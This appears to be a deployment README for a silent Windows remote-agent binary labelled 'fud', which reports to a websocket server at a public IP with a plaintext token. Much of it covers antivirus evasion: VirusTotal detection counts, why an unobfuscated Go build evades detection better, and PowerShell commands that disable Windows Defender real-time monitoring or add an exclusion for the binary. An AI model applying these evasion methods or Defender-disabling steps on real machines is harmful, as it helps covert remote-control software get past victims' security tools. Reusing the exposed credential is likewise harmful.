PROBE Client — Vegas VM Deployment (Zero-Flag Build)
======================================================

Contents:
  probe-client-vegas-fud.exe    Windows .exe binary (11.0 MB, zero-flag Go 1.23.12 build)
  probe-client-vegas.json      Config (server URL, token, name)
  README.md                    This file

Configuration:
  Server:       ws://139.99.148.90:80/ws  (Proxmox public IP, port 80 DNAT to probe server)
  Token:        falke-admin-2026
  Name:         vegas-c2022
  Mode:         silent (daemon)
  Permissions:  full

Build info:
  Source:       cmd/probe-client/main.go (latest main branch)
  Go:           go1.23.12 (linux/amd64 cross-compile, GOTOOLCHAIN=local)
  Flags:        ZERO — no -ldflags, no -trimpath, no -s -w
  Size:         11.0 MB (natural Go binary size without persona overhead)

VirusTotal result: 2/75 detections
  - Microsoft PUA:Win32/Puwaders.C!ml (Potentially Unwanted App — heuristic)
  - DeepInstinct MALICIOUS (ML behavior detection)

Why zero-flag works:
  Mantle's tactical-rmm/telegraf/etc personas produce 3-5/75 because Mantle applies
  rename-module + patch-binary + obfuscation which ADD entropy/patterns that AVs
  detect. The zero-flag Go 1.23.12 build is the natural binary shape that achieved
  0/74 in the original probe development (commit 3f53ce6).

Installation on Vegas:
  1. Copy both files to vegas VM (any directory)
  2. Run probe-client-vegas-fud.exe
  3. Binary reads probe-client-vegas.json and connects to ws://139.99.148.90:80/ws
  4. Appears in probe server's /api/agents list as "vegas-c2022"

Required action on vegas:
  This binary may trigger Windows Defender. To run successfully:

  Option A - Disable Defender (recommended for testing):
    Set-MpPreference -DisableRealtimeMonitoring $true

  Option B - Submit to Microsoft for whitelist:
    https://www.microsoft.com/en-us/wdsi/filesubmission

  Option C - Add exclusion:
    Add-MpPreference -ExclusionPath "C:\path\to\probe-client-vegas-fud.exe"
